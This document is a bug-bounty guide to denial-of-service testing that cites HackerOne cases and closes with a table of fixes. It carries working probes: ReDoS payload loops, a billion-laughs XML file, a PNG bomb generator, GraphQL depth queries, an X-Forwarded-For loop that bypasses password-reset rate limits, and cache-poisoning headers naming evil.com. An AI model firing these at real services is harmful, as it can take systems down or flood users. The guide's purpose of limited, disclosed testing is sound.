# Denial of Service (DoS)

> Perspective: black-box; the goal is to prove "if you kept going, the target would die" with minimal traffic, and never actually take the target down
> Covers 116 real H1 high-severity DoS cases, spanning Tomcat / Node.js / mruby / GitLab / Discourse / WordPress / Cloudflare CDN / RSK / Monero

---

## 1. What it is in one sentence + why SRC cares

DoS = making the service **consume resources (CPU / memory / file handles / database connections / bandwidth)** far beyond what it takes to process one normal request, preventing legitimate users from accessing it.
Formula: **amplification ratio = attack cost / target resource consumption**. Amplification ratio ≥ 1:1000 → P3, ≥ 1:100000 or single-packet kill → P2/P1.

**Why SRC cares**:
- DoS is the "billing bomb" lever for pay-per-use cloud services (Lambda / GraphQL parsing / video transcoding)
- Application-layer DoS usually cannot be blocked by WAF / Cloudflare (the traffic is legitimate)
- Vulnerabilities that kill the backend with a single packet / single connection (CVE-2024-27983 Node.js HTTP/2, CVE-2024-34750 Tomcat) are high-severity
- DoS inside mruby / V8 / sandbox interpreters is usually classified as a security bug rather than an ordinary bug, because the attack surface is untrusted code

**DoS types SRC usually excludes (check scope first)**:
- Network-layer floods (SYN flood / UDP flood / reflection amplification)
- Rate limiting that is not strict enough but cannot be amplified
- Local-PoC-only fork bombs / client-side DoS

**DoS types SRC usually accepts**:
- A single/small number of requests exhausting global resources (not just affecting yourself)
- Cache poisoning (one request makes all users get 4xx/5xx)
- Algorithmic complexity flaws (ReDoS / hash collision / O(n²) parsing)
- Brute force / email bombing after bypassing rate limiting
- Interpreter/parser segfault (direct process crash)

---

## 2. Attack type classification

### 2.1 Regex DoS (ReDoS / catastrophic backtracking)

A regex with nested quantifiers `(a+)+`, `(a|a)+`, `(.*)*` backtracks explosively on specific input.
Keywords: catastrophic backtracking, super-linear regex.
Impact: a single request pegs 1 CPU core for seconds to minutes.
Real case: CVE-2023-28756 Ruby `Time.rfc2822()` ReDoS (automatically called by `Rack::ConditionalGet`, triggerable by an HTTP request).

**Typical suspicious regexes**:
```
^(a+)+$
^(a|a)+$
^(a|aa)+$
^(.*),(.*),(.*),(.*),(.*)$    # multiple .* Cartesian
^([\w]+\s?)+$
^([0-9]+)*[a-z]$
```

### 2.2 Algorithmic complexity explosion (zip slip / billion laughs / hash collision / nesting depth)

Linear growth of input size → exponential growth of backend processing time/memory.

| Sub-category | Trigger surface | Amplification ratio |
|---|---|---|
| XML billion laughs | XML/SOAP parsing | 1KB → 3GB memory |
| YAML/JSON deep nesting | API body parsing | 100KB → stack overflow |
| GraphQL nested query | `/graphql` | 1KB → millions of database rows |
| Markdown rendering | comments / issues / rich text | 1MB → CPU 60s (GitLab #1543718) |
| Image bomb | image upload / avatar | 100KB png → several GB pixel buffer |
| zip bomb | archive extraction | 42KB → 4.5PB |
| ZIP slip + extraction loop | upload extraction | a single filename → 100% CPU |
| Hash collision (CVE-2011-3414 class) | a form with many keys triggers HashMap O(n²) | 1000 keys → 10s processing |

### 2.3 Unthrottled resources (unthrottled API / no upload size limit / no timeout)

The application itself has no algorithmic flaw with "N complexity M times cost," but lacks quota / cap / circuit breaker.
Real forms:
- moneybird #723974: changing `X-Forwarded-For` bypasses rate limit → brute force / email bombing / account enumeration
- HEY/Basecamp #1018037: no username length limit; an overly long name causes a server-side 500 + client-side Android crash
- WordPress #2786591: unauthenticated access to `/wp-admin/maint/repair.php`, repeatedly triggering DB repair to exhaust resources
- Discourse #3058919: reply accepts ~800k characters of markdown, a single request 30s + 502
- HTTP/2 CONTINUATION flood (CVE-2024-24549 Tomcat / CVE-2024-27983 Node.js): unbounded connection-level header buffering

### 2.4 Memory explosion (image/video/SVG decoding)

The special point: the decoder allocates a buffer based on the "declared dimensions" when parsing the header, but the actual data can be very small.
Typical:
- libpng / libjpeg: declare 100000×100000 → 40GB malloc
- SVG nested `<use>` / `<filter>`: DOM rendering grows exponentially
- Video H.264: high resolution / high fps / long duration, the product of the three explodes
- Font (OpenType): composite glyph self-reference → infinite recursion

### 2.5 Database DoS (no LIMIT / full table scan / Cartesian product / lock contention)

- Search endpoint without pagination: `?q=` returns 1 million rows
- ORM N+1: each row in a comment list triggers a user query
- LIKE `%abc%` forces a full table scan
- ORDER BY on a large field + no index
- Long transaction / SELECT FOR UPDATE exhausts the connection pool
- Monero RPC deadlock (#3307874 class): a carefully crafted RPC call completely freezes the node

### 2.6 Third-party amplification (DNS / NTP / Memcached reflection — rare in SRC)

Usually out of SRC scope (ISP / IDC responsibility). Only counts when the target itself exposes a UDP service on the public internet and the response is far larger than the request (e.g. an RSK node exposing UDPv6:5050, #2105808).

### 2.7 Business-level DoS (CAPTCHA-less brute force / resource-occupation attack / business-logic lockup)

- SMS bombing: no limit on the frequency of calling `/sms/send` per phone number / per IP
- Email bombing: no rate limit on registration / password recovery
- Cache poisoning (cache-poisoning DoS): one request poisons the CDN, all users get 4xx — see #1173153 Exodus, #1160407 GitLab CDN
- Order lockup: bulk order placement without payment, holding inventory for 30 minutes (a business SLA killer)
- Blockchain node: a crafted smart contract makes the EVM run a single transaction for 8 minutes (RSK #2412583)
- P2P node connection table saturation: connections with incomplete handshakes occupy slots without releasing them (RSK PeerExplorer #363636)

---

## 3. High-frequency entry points (endpoints/parameters/headers)

### 3.1 Application-layer endpoints most prone to being hit

```
# Markdown / rich-text preview
POST /api/markdown/preview
POST /preview_markdown
POST /comments
POST /issues/preview
POST /reply

# Unbounded user input
POST /profile        name / display_name / bio
POST /signup         username / email
POST /workspace      workspace_name

# Search (no LIMIT / LIKE wildcard)
GET /search?q=
GET /api/search?keyword=

# Upload (image / document / archive)
POST /upload         multipart field
POST /avatar
POST /import

# Unauthenticated maintenance endpoints
GET /wp-admin/maint/repair.php           # WordPress
GET /admin/cache/clear                   # various admin panels
GET /actuator/heapdump                   # Spring (also information disclosure)

# Parsing / conversion
POST /api/convert    format conversion
POST /api/render     SSR / PDF generation
POST /graphql        nested query
```

### 3.2 High-frequency dangerous parameters / headers

```
# Headers (bypass rate limit / trigger cache mismatch)
X-Forwarded-For      # change value → reset IP rate-limit bucket
X-Real-IP
X-Originating-IP
True-Client-IP
Forwarded
X-HTTP-Method-Override   # → cache poisoning (GitLab CDN)
Authorization        # an abnormal token makes upstream return 403 that gets cached (Exodus)
Content-Length       # combined with HTTP smuggling
Transfer-Encoding    # chunked + no size limit

# Body
name / username / display_name      # no length limit
description / bio / content
markdown / body / message
filter / query                      # complex expression
sort                                # sort on an unindexed column
include                             # join query depth

# HTTP/2 specific
HEADERS + N * CONTINUATION frames   # CVE-2024-24549/27983
SETTINGS_HEADER_TABLE_SIZE
SETTINGS_MAX_CONCURRENT_STREAMS
```

### 3.3 Protocol layer

| Protocol | Entry |
|---|---|
| HTTP/1.1 | `Transfer-Encoding: chunked` unbounded chunk extension |
| HTTP/2 | CONTINUATION flood / RST flood / 0-byte WINDOW |
| WebSocket | no ping timeout + slow consumption |
| GraphQL | nesting depth / alias repetition / `__schema` introspection + recursion |
| gRPC | message repeated metadata headers |
| UDP/RPC | node discovery / Geth/RSKJ peer discovery (#2105808 #363636) |

---

## 4. Probing techniques (black-box perspective)

**Core principle: measure the "amplification ratio" with a single request first, and never actually run it to the maximum.**

### 4.1 ReDoS probing

```bash
# Find regex fields: search / email / URL / time / username validation
# Test payloads (exponential backtracking)
EMAIL_REDOS='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
TIME_REDOS='Sun, 06 Nov 1994 08:49:37 GMT' + ' '*10000     # CVE-2023-28756
URL_REDOS='http://aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.aa.!'

# Use a doubling method to find the inflection point (key: keep the timing data, do not run to the maximum)
for n in 10 20 30 40 50; do
  PAYLOAD=$(python3 -c "print('a'*$n + '!')")
  time curl -s "https://target/login" -d "email=$PAYLOAD" -o /dev/null
done
# Expect the time to go from ms → 100ms → 1s → 10s → 100s (exponential growth)
# Once exponential growth is confirmed, stop immediately; do not increase n further
```

**Verdict**: increasing n by 10 grows the time ≥ 4× (should be close to 2^k) = almost certainly ReDoS.

### 4.2 Large-payload probing (markdown / json / xml)

```bash
# Nested markdown images (GitLab #1543718 measured CPU 60s)
python3 -c "print('![l' * 200000)" > /tmp/p.md       # start with 200k rather than a full 1MB

# Nested JSON
python3 -c "print('{\"a\":'*5000 + '1' + '}'*5000)" > /tmp/p.json

# Billion laughs (only fire when XML / DTD is known to be accepted)
cat > /tmp/bl.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE l [
 <!ENTITY a0 "DDDD">
 <!ENTITY a1 "&a0;&a0;&a0;&a0;">
 <!ENTITY a2 "&a1;&a1;&a1;&a1;">
 <!ENTITY a3 "&a2;&a2;&a2;&a2;">
 <!ENTITY a4 "&a3;&a3;&a3;&a3;">
]>
<l>&a4;</l>
EOF
# Use a4 rather than a8; first verify the server can parse the DTD
```

### 4.3 GraphQL depth / alias probing

```graphql
# Depth explosion (user → posts → user → posts → ...)
query Q {
  user(id:1) {
    posts {
      author {
        posts {
          author { id }
        }
      }
    }
  }
}
# Test 5 levels, 10 levels, 15 levels and observe response time

# Alias explosion (the same field N times)
query Q {
  a1: user(id:1){id}  a2: user(id:2){id}  ...  a100: user(id:100){id}
}

# Introspection + circular types
query { __schema { types { fields { type { fields { type { name } } } } } } }
```

### 4.4 Cache poisoning DoS

```bash
# Idea: find a header / param that upstream parses but the CDN ignores, making upstream return an error that gets cached
# Probe headers
HEADERS=(
  "X-HTTP-Method-Override: POST"
  "X-Forwarded-Proto: invalid"
  "X-Forwarded-Host: evil.com"
  "Authorization: SharedKeyLite x:y"      # Azure (Exodus case)
  "Forwarded: for=invalid"
)

for h in "${HEADERS[@]}"; do
  # Always include a cachebuster to avoid real poisoning
  curl -is "https://target/asset.js?cachebuster=$(uuidgen)" -H "$h" | head -20
done

# Signal: returns 4xx/5xx + response has X-Cache: MISS (indicating it will be cached)
# A second request to the same URL without the header → getting the cached 4xx = poisoning succeeded
```

### 4.5 HTTP/2 protocol-layer probing

```bash
# Use nghttp2 / h2load to detect CVE-2024-24549 / 27983 / CONTINUATION flood
# Probe whether HEADERS + many CONTINUATION are reset
nghttp -nv https://target/ -H "x-test: $(python3 -c 'print("A"*10000)')"

# Observe: whether the connection is immediately RST, whether headers are received without size limit
# Old versions of Tomcat / Node.js keep receiving and eventually OOM
```

### 4.6 Rate-limit bypass probing

```bash
# Bypass technique: change one value per request
for i in $(seq 1 50); do
  curl -s "https://target/api/forgot" \
    -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
    -d 'email=victim@example.com' \
    -o /dev/null -w '%{http_code}\n'
done
# No 429 = rate limit is bypassable. Stopping at 50 is enough to prove it; never actually run to 1000+
```

### 4.7 Upload / decoding-bomb probing (high risk, reproduce locally first)

```bash
# Image bomb: a PNG declaring 50000x50000
python3 - <<'EOF'
import struct, zlib
sig = b'\x89PNG\r\n\x1a\n'
# IHDR: width=50000, height=50000, bit_depth=8, color=2 (RGB)
ihdr = b'IHDR' + struct.pack('>IIBBBBB', 50000,50000,8,2,0,0,0)
crc = zlib.crc32(ihdr)
chunk = struct.pack('>I',13) + ihdr + struct.pack('>I',crc)
open('/tmp/bomb.png','wb').write(sig + chunk)  # file < 100B
EOF
# On upload, observe response time / errors. If the service tries to decode → 50000*50000*3 = 7.5GB memory

# zip bomb (verify with 1 small layer first; do not actually fire 42.zip)
python3 - <<'EOF'
import zipfile
with zipfile.ZipFile('/tmp/small.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('a.txt', 'A'*1000000)   # 1MB → compressed ~1KB
EOF
```

### 4.8 Response-characteristic checklist

| Phenomenon | Meaning |
|---|---|
| 200 but response time > 30s | algorithmic flaw / slow query |
| 502 / 504 | upstream already killed or timeout |
| 503 + Retry-After | rate limit in effect (protection is in place) |
| Connection: close | server proactively disconnects (protection mechanism) |
| memory type: response normal but the next is slower | memory leak, gets worse until restart |
| Cache-Status / X-Cache: HIT on an error page | cache poisoning succeeded |
| no 429 + high-frequency success on the same endpoint | missing rate limit |

---

## 5. Exploitation and impact escalation

### 5.1 Single point → global

```
ReDoS (single request 1 CPU·60s)
  → N concurrent = N CPUs saturated → whole machine down
  → backend is a shared pool → affects all tenants

Markdown / preview DoS (GitLab #1543718)
  → preview API is public (self-registration is enough)
  → single packet 1 CPU 60s, a DockerHub instance dies with 5 packets

Cache poisoning (Exodus #1173153 / GitLab CDN #1160407)
  → one injection poisons the CDN
  → all users accessing that URL get 4xx
  → scope = CDN node coverage (global)
  → long TTL = until ops manually clears it
```

### 5.2 Economic impact

| Model | Attack cost | Victim loss |
|---|---|---|
| Pay-per-use Lambda | $0.01 | triggering 1 million invokes = $200+ |
| GraphQL / database | one query | triggering cluster autoscale = $$ |
| Transcode / OCR / OpenAI relay | 100KB text | triggering upstream API billing |
| CDN traffic | trigger origin fetch | origin bandwidth ×10 |
| Email / SMS (business-level) | 1 request | single SMS $0.01–$0.1 × volume |
| SMS bombing | 0 cost | legal + brand + fines |

### 5.3 Sandbox / interpreter escalation chain

The mruby/Shopify series of reports (#187305 #188326 #183356 #182484 #181828 #181232 #181695 #181910 #184712 #188313 #187536 #181685 #183425 #183405) pattern:

```
Untrusted Ruby input
  → mruby parsing / bytecode generation bug
  → segfault / null deref / out-of-bounds
  → kills the parent MRI process (sandbox + host)
  → other tenants in the same process are affected → multi-tenant impact amplified
  → some (e.g. #181910 type confusion) have RCE potential
```

Value judgment:
- segfault only → DoS
- segfault + control of the crash location → possible RCE → value ×10

---

## 6. Real H1 cases

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| High | 5000 | RootstockLabs | [DOS of RSKJ server](https://hackerone.com/reports/2105808) | UDPv6:5050 node discovery port; a single RLP length-abnormal packet permanently freezes UDPServer, and the whole RSK node crashes a few minutes later |
| High | — | Moneybird | [Bypass password reset rate limit at moneybird.com/passwords](https://hackerone.com/reports/723974) | Changing `X-Forwarded-For` each time bypasses 429, enabling brute force / email bombing / email enumeration |
| High | 1000 | Basecamp | [a very long name in hey.com prevents accessing contacts](https://hackerone.com/reports/1018037) | No username length limit: server-side 500, Android app crashes directly, a mutual-kick DoS |
| High | 4920 | IBB | [CVE-2024-34750 Apache Tomcat HTTP/2 DoS](https://hackerone.com/reports/2586226) | HTTP/2 stream-counting error causes infinite timeout, connections not released, OOM or maxConnections saturation |
| High | 4860 | IBB | [DoS via HTTP/2 CONTINUATION Flood](https://hackerone.com/reports/2334401) | CVE-2024-24549, HEADERS + many CONTINUATION make Tomcat HpackHuffman OOM |
| High | 7640 | GitLab | [DOS via issue preview](https://hackerone.com/reports/1543718) | preview_markdown receives 1MB nested-image markdown, CPU 60s/request, a few concurrent requests saturate the whole machine |
| High | 4000 | IBB | [ReDoS in Ruby Time](https://hackerone.com/reports/1929567) | CVE-2023-28756, `Time.rfc2822` ReDoS, called automatically by Rack::ConditionalGet, triggered by an HTTP request |
| High | 4000 | RootstockLabs | [DoS through PeerExplorer](https://hackerone.com/reports/363636) | P2P handshake pending table not cleaned up; attacker floods handshake requests to exhaust node connection slots |
| High | 3645 | IBB | [Node.js HTTP/2 Http2Session::~Http2Session() crash](https://hackerone.com/reports/2453328) | CVE-2024-27983, CONTINUATION + a sudden RST triggers a destructor race, process crashes immediately |
| High | 3495 | IBB | [Node.js HTTP unbounded chunk extension DoS](https://hackerone.com/reports/2375446) | CVE-2024-22019, unbounded chunk extension in chunked encoding, eats up CPU/bandwidth, both timeout and body limit fail |
| High | — | Discourse | [Application Level DoS - Large Markdown in Reply](https://hackerone.com/reports/3058919) | A ~800k-character markdown reply makes the backend take 30s + 502; concurrency exhausts resources |
| High | — | Exodus | [Cache Poisoning DoS on downloads.exodus.com](https://hackerone.com/reports/1173153) | A crafted Authorization header makes Azure return 403, cached by Cloudflare, all users fail to download |
| High | — | GitLab | [Cache poisoning DoS on assets.gitlab-static.net](https://hackerone.com/reports/1160407) | `X-HTTP-Method-Override` makes GCP return non-200, Varnish caches the empty response, all site static assets fail |
| High | — | RootstockLabs | [Crafted smart contract takes 8 min via modexp precompile](https://hackerone.com/reports/2412583) | EVM modexp precompile gas billing vs actual runtime mismatch, a single transaction stalls 8 minutes |
| High | — | WordPress | [Unauthenticated WordPress Database Repair DoS](https://hackerone.com/reports/2786591) | When `WP_ALLOW_REPAIR=true`, `/wp-admin/maint/repair.php` can be triggered repeatedly without authentication to run database repair |
| High | 10000 | Shopify Scripts | [Infinite loop on zero-length heredoc identifier](https://hackerone.com/reports/187305) | The mruby parser loops forever on `<<''.a begin`; the sandbox does not respond to SIGTERM and requires SIGKILL |
| High | 10000 | Shopify Scripts | [Buffer overflow in mrb_time_asctime](https://hackerone.com/reports/188326) | `Time.new-0xD00000000000000&0` segfault; buffer over-read reads out-of-stack strings |
| High | 10000 | Shopify Scripts | [Range constructor type confusion DoS](https://hackerone.com/reports/181910) | `Range = Array; (1..2).inspect` accesses RRange.edges as an iv field, type confusion with potential RCE |
| High | 10000 | Shopify Scripts | [Segfault with break/&#124;&#124;= in loop](https://hackerone.com/reports/183356) | `A &#124;&#124;= break while break` causes an mruby bytecode generation exception, segfault or execution of unexpected bytecode |
| High | 8000 | Shopify Scripts | [DoS in mruby_engine via send/initialize alias](https://hackerone.com/reports/183425) | `alias_method :initialize, :send` makes C call a Ruby method, segfaulting the parent process |

**Weakness distribution for hits in this category (116 entries)**:
- HTTP/2 protocol layer (CONTINUATION / stream counting / destructor race): ~12
- Ruby interpreter (mruby / MRI) segfault / infinite loop: ~25
- Markdown / rich text / preview large payload: ~8
- Cache poisoning DoS: ~6
- Business rate-limit bypass / business-level flood: ~9
- ReDoS (regex catastrophic backtracking): ~5
- P2P / blockchain node DoS: ~6
- Decoding bomb (image / zip / xml): ~4
- Others (database / fields with no length limit / parse stack overflow): ~41

---

## 7. Reproduction / evidence essentials

### 7.1 Key principle: control intensity

**The report must explicitly state three things**; missing one will make ops suspect abuse:

1. **Prove amplification with low traffic**: "1 request → 60 seconds of 1 CPU"
2. **Stop immediately**: "PoC single execution ≤ 1 minute, no concurrency"
3. **No impact on others**: "used a cachebuster parameter to ensure the shared cache was not polluted / used a dedicated test account"

### 7.2 PoC template

```http
# Baseline: normal request
POST /api/preview HTTP/1.1
Host: target.com
Content-Length: 12

hello world

→ response time: 85ms
→ HTTP 200

# Attack: 1 request
POST /api/preview HTTP/1.1
Host: target.com
Content-Length: 102400

![l![l![l...(a total of ~33000 ![l sequences, about 100KB)

→ response time: 62.4 s
→ HTTP 502 (upstream timeout)
→ server log: CPU 100% (single core), lasting 60s

# 5 reproductions (executed sequentially, no concurrency):
1: 60.2s, 502
2: 61.8s, 502
3: 60.5s, 502
4: 61.1s, 502
5: 60.7s, 502

# Amplification ratio: 85ms → 60s = 705x
# Measured that 5 concurrent requests suffice to make a single instance unavailable (not attempted after stopping)
```

### 7.3 Evidence collection

```bash
# Use curl -w to record precise timing
curl -s -o /dev/null \
  -w 'time_total=%{time_total} http_code=%{http_code} size=%{size_download}\n' \
  -X POST "https://target/api/preview" \
  --data-binary @payload.bin

# Use hyperfine for multiple measurements
hyperfine --runs 5 \
  'curl -s -o /dev/null -X POST "https://target/api/preview" --data-binary @baseline.bin' \
  'curl -s -o /dev/null -X POST "https://target/api/preview" --data-binary @evil.bin'
```

Keep in the report attachments:
- baseline request / response (with full headers)
- evil request / response
- 5 timing measurements
- a curve of response time growing with payload size (proving exponential / super-linear)

### 7.4 CVSS 4.0 phrasing (DoS class)

DoS impact is primarily Availability; key vectors:
```
# Unauthenticated-triggerable application-layer DoS (typical GitLab preview / Discourse markdown)
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
  AT:N  no attack prerequisites
  AC:L  low complexity, single-packet kill
  VA:H  high impact on target availability
  → 8.7 (High)

# Triggered post-authentication (comment / upload)
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
  → 8.2 (High)

# Cache poisoning DoS (affects other users SC:H)
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:H
  SA:H  Subsequent System Availability High (downstream CDN users)
  → 8.7 (High)

# Rate-limit bypass (no amplification, auxiliary only)
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N
  → 6.9 (Medium)

# Sandbox / interpreter segfault (affects host process)
CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H
  → 6.8 (if a script can be submitted remotely then AV:N → 8.7)
```

Experience: DoS reports easily get their severity cut by one tier. DoS with strong evidence (amplification ratio + reproduction + clear business impact) — the Tomcat / Node.js / GitLab cases all earned $3000-$10000.

### 7.5 Impact-section phrasing

```
Via the markdown field of the /api/preview endpoint, a single ~100KB repeated ![l sequence
saturates a single core of the server for 60 seconds, during which the backend instance cannot process other requests.

Amplification ratio: 100KB input → 60s × 1 CPU = ~600ms·core/byte, 705x higher than a normal request.

Concurrency impact (not measured, estimated only):
- 5 concurrent requests suffice to saturate a 4-core instance
- The endpoint is open to all registered users (self-registration cost ≤ 1 minute)
- Attack barrier: single IP, no token required

I have stopped testing, did not run a long sustained DoS, and did not run multi-instance concurrency.
Recommendation: limit preview input size (e.g. 10KB) + rendering timeout (e.g. 2s).
```

---

## 8. Things not to do (DoS-class compliance boundary — most sensitive)

**Iron rule**: DoS is the only vulnerability class in SRC where "the PoC itself may be illegal." Before every step, ask yourself: did this actually affect other users? Can I stop immediately?

### 8.1 Always forbidden
- **Long-duration load testing in production**. Any PoC lasting > 60 seconds = over the line.
- **sustained DoS**. Validate once and stop; do not run automated fuzzing attacks against production.
- **Real DDoS**. Even if you just want to "test Cloudflare," it is illegal + violates ToS.
- **Reflection amplification**. Even if the target exposes a UDP service, proving "it can amplify" ≠ actually firing. Use logs / analysis to prove it instead.
- **Multi-process concurrency at the same time**. Even multiple reproductions of the same vulnerability must be serial.
- **Cache poisoning without a cachebuster**. Always use `?cachebuster=$(uuidgen)` or a custom path to avoid polluting the shared cache. The Exodus / GitLab reports both explicitly include this disclaimer.
- **Testing against other users**. Use two of your own registered test accounts; do not attack admin / public accounts.
- **Running business-level floods (SMS / email) to the maximum**. Proving "no rate limit" takes 5–10 attempts; do not actually send 1000 messages.
- **Actually operating on the host after a sandbox-escape-style PoC**. Prove segfault → submit; do not execute a binary on the host.

### 8.2 Recommended practices

- **Small batches + stop immediately**: 5 reproductions, each ≤ 60s, all serial.
- **Prefer an isolated environment**: if you can spin up the target software version locally in docker / vagrant → reproduce locally + screenshot + flame graph, and remotely do only the "final confirmation."
- **Coordinated disclosure**: do not do any "high-rate" testing before the program explicitly allows it. The Tomcat / Node.js / Ruby batch of IBB reports all reported upstream first → obtained a CVE → then went to H1 for the bounty.
- **Announce the time window**: state in the report "test time: UTC 2026-05-09 14:32:00–14:33:00, single run."
- **Stop signal**: include "how to disable/mitigate" recommendations (limit size, limit timeout, limit rate) so ops understands you are on their side.

### 8.3 What to include / not include in the report

| Include | Do not include |
|---|---|
| Amplification-ratio formula + data | Automated fuzz script |
| 5 serial reproduction timings | Concurrency script / botnet simulation |
| One small PoC (≤ 100KB) | 42.zip / multi-GB bomb file |
| Test account username | Real other user ID |
| cachebuster traces | Real production URL poisoning |
| Remediation advice (rate limit / size limit / regex replacement) | Lengthy threat modeling (ops assesses on its own) |

---

## 9. Defense / remediation cheat sheet (for the report appendix)

| Vulnerability class | Fix |
|---|---|
| ReDoS | replace with RE2 / linear regex; limit with `re2` / `pcre2` JIT; input length cap |
| Large-payload markdown | input length cap (10KB) + rendering timeout (2s) + queueing |
| GraphQL nesting | depth-limit / cost-analysis / persisted queries |
| Cache poisoning | correct Vary header configuration + upstream normalization + do not cache 4xx/5xx |
| HTTP/2 CONTINUATION | upgrade Tomcat / Node.js to patched versions, limit total header size |
| No rate limit | multi-dimensional key (IP + account + endpoint) + do not trust X-Forwarded-For |
| Decoding bomb | check file header before parsing + memory cap + single-process isolation |
| Sandbox segfault | upgrade interpreter + ASAN fuzz + seccomp restrictions |
| DB DoS | enforce LIMIT + slow-query monitoring + connection pool cap + timeout |

> One sentence for ops: **A DoS vulnerability ≠ "the service is slow." It is "under attacker control, per-unit resource consumption × business impact" exceeding design assumptions**. The fix is always one of three: limit size, limit time, limit rate.

## H1 real cases

_A total of 138 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| High | 15000 usd | Cosmos | [Groups module can halt chain when handling a proposal with malicious group weights](https://hackerone.com/reports/3018307) | Summary of Impact After having a look into the patch for https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h… |
| High | 5000 usd | Rootstock Labs | [DOS of RSKJ server](https://hackerone.com/reports/2105808) | Due of closing of report (ID #2102315) I will summarize total reproducible report here Summary: DOS of RSKJ server Steps To Rep… |
| High | — | Moneybird | [Bypass password reset rate limit protection at moneybird.com/passwords](https://hackerone.com/reports/723974) | Bypass password reset rate limit protection at moneybird.com/passwords |
| High | 1000 usd | Basecamp | [a very long name in hey.com can prevent anyone from accessing their contacts and probably can cau…](https://hackerone.com/reports/1018037) | Summary : ========= after trying to change my initial name to something long i found out that their are no limits to how long i… |
| High | 10000 usd | shopify-scripts | [Invalid handling of zero-length heredoc identifiers leads to infinite loop in the sandbox](https://hackerone.com/reports/187305) | Introduction ============ Certain invalid Ruby programs (which should normally raise a syntax error) are able to cause an infin… |
| High | 10000 usd | shopify-scripts | [Segfault and/or potential unwanted (byte)code execution with "break" and "//=" inside a loop](https://hackerone.com/reports/183356) | Introduction ============ Certain invalid inputs (invalid Ruby programs) crash mruby and mruby_engine (including the parent MRI… |
| High | 10000 usd | shopify-scripts | [Buffer overflow in mrb_time_asctime](https://hackerone.com/reports/188326) | Hi, This one doesn't always crash every time, but with ASAN on it will |
| High | 5420 usd | Internet Bug Bounty | [Possible DoS Vulnerability with Range Header in Rack](https://hackerone.com/reports/2520679) | I made a report and patch at https://hackerone.com/reports/2307813. https://discuss.rubyonrails.org/t/possible-dos-vulnerabilit… |
| High | 10000 usd | shopify-scripts | [Broken handling of maximum number of method call arguments leads to segfault](https://hackerone.com/reports/182484) | Introduction ============ Improper logic for handling of maximum number of method call arguments leads to dereferencing an inva… |
| High | 4920 usd | Internet Bug Bounty | [CVE-2024-34750 Apache Tomcat DoS vulnerability in HTTP/2 connector](https://hackerone.com/reports/2586226) | Hello IBB team, i would like to submit a report about Apache Tomcat DoS vulnerability that i have reported to the Tomcat team, … |
| High | 10000 usd | shopify-scripts | [Crash: Initialize Decimal with itself triggers an assertion](https://hackerone.com/reports/185775) | When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created |
| High | 10000 usd | shopify-scripts | [Range#initialize_copy null pointer dereference](https://hackerone.com/reports/181685) | Heya! It's possible to segfault mruby through mruby-engine with the following snippet of code: Range.remove_method(:initialize_… |

**Weakness distribution for hits in this category:**

- Uncontrolled Resource Consumption: 116 entries
- Uncategorized → manually classified: 19 entries
- Allocation of Resources Without Limits or Throttling: 3 entries
